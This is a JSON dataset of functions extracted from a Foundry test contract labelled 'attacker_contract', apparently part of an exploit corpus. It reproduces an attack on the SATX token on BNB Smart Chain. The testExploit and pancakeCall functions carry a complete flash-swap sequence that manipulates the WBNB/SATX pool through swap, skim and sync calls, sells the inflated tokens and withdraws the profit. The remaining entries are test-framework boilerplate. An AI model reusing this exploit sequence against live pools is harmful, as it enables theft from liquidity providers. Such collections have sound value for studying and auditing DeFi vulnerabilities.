[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "approveAll",
    "original_code": "    function approveAll() public {\n        SATX.approve(address(router), type(uint256).max);\n        WBNB.approve(address(router), type(uint256).max);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "attacker",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        if (msg.sender == address(pair_WBNB_CAKE)) {\n            uint256 SATX_amount = SATX.balanceOf(address(pair_WBNB_SATX));\n            pair_WBNB_SATX.swap(100_000_000_000_000, SATX_amount / 2, attacker, data);\n\n            uint256 SATX_amount_1 = SATX.balanceOf(attacker);\n            SATX.transfer(address(pair_WBNB_SATX), SATX_amount_1);\n            pair_WBNB_SATX.skim(attacker);\n            pair_WBNB_SATX.sync();\n            WBNB.transfer(address(pair_WBNB_SATX), 100_000_000_000_000);\n            uint256 SATX_amount_2 = SATX.balanceOf(attacker);\n            address[] memory path = new address[](2);\n            path[0] = address(SATX);\n            path[1] = address(WBNB);\n            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                SATX_amount_2, 0, path, attacker, type(uint256).max\n            );\n            WBNB.transfer(address(pair_WBNB_CAKE), 60_150_600_000_000_000_000);\n        } else if (msg.sender == address(pair_WBNB_SATX)) {\n            WBNB.transfer(address(pair_WBNB_SATX), 52_000_000_000_000_000_000);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 37_914_434 - 1);\n        vm.label(address(SATX), \"SATX\");\n        vm.label(address(WBNB), \"WBNB\");\n        vm.label(address(router), \"PancakeSwap Router\");\n        vm.label(address(pair_WBNB_SATX), \"pair_WBNB_SATX\");\n        vm.label(address(pair_WBNB_CAKE), \"pair_WBNB_CAKE\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(attacker, 0.900000001 ether);\n        WBNB.deposit{value: 0.9 ether}();\n        approveAll();\n        address[] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(SATX);\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            1_000_000_000_000_000, 0, path, attacker, type(uint256).max\n        );\n        uint256 SATX_amount = SATX.balanceOf(attacker);\n        router.addLiquidity(\n            address(WBNB), address(SATX), 1_000_000_000_000_000, SATX_amount, 0, 0, attacker, type(uint256).max\n        );\n        pair_WBNB_CAKE.swap(0, 60_000_000_000_000_000_000, attacker, bytes(\"1\"));\n\n        uint256 WBNB_amount = WBNB.balanceOf(attacker);\n        WBNB.withdraw(WBNB_amount);\n    }\n\n",
    "description": ""
  }
]